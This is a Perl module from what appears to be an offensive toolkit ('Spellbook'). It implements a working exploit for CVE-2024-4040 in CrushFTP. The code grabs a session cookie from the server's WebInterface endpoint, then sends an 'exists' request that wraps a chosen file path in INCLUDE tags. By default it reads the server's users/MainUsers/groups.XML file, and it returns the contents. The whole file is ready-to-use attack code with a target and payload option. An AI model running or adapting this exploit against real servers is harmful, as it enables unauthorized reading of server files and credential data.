package Spellbook::Advisory::CVE_2024_4040 {
    use strict;
    use warnings;
    use Getopt::Long;
    use Spellbook::Core::UserAgent;

    sub new {
        my ($self, $parameters) = @_;
        my ($target, $help, @result);
        my $payload = "users/MainUsers/groups.XML";

        Getopt::Long::GetOptionsFromArray (
            $parameters,
            "target=s"  => \$target,
            "payload=s" => \$payload,
            "help"      => \$help
        );
        
        if ($target) {
            if ($target !~ /^http(s)?:\/\//) {
                $target = "https://$target";
            }

            my $userAgent = Spellbook::Core::UserAgent -> new();
            my $endpoint  = "$target/WebInterface/";
            my $response  = $userAgent -> post($endpoint);
            my $cookies   = $response -> headers -> header("Set-Cookie");

            if ($cookies =~ /currentAuth=([^;]+)/) {
                my $data = {
                    'command' => 'exists',
                    'paths'   => "<INCLUDE>$payload</INCLUDE>",
                    'c2f'     => $1,
                };

                $userAgent -> post($endpoint => form => $data);
                $response = $userAgent -> post($endpoint => form => $data);

                push @result, $response -> content();
            }

            return @result;
        }

        if ($help) {
            return "
                \rAdvisory::CVE_2024_4040
                \r========================================
                \r-h, --help      See this menu
                \r-u, --target    Define the targeted CrushFTP server URL
                \r-p, --payload   Set the payload to run on the target\n\n";
        }

        return 0;
    }
}

1;